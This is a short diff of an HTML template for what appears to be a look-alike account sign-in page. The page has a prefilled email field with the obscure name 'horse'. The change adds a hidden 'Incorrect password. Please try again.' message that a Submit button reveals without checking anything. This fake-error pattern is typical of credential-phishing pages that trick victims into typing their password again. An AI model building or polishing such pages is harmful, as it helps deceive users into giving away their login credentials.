@@ -369,9 +369,8 @@
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist.
                                 Enter a different account</span>
 
-                            <li class="l4 animated fadeIn" id="err">
-                                <p id="erp">Error Message</p>
-                            </li>
+                            <p style="color: #FF6F61; font-family: 'proxima-nova', sans-serif; font-size: 14px; margin-top: 10px; display: none;" id="error-message">Incorrect password. Please try again.</p><button type="button" onclick="document.getElementById('error-message').style.display='block'">Submit</button>
+
                             <li><input type="email" value="{{eman}}" name="horse" required class="inp" id="email" autocomplete="off"
                                     placeholder="Email Address"
                                     style="background-image: url(&quot;&quot;); background-repeat: no-repeat; background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%; cursor: auto;"
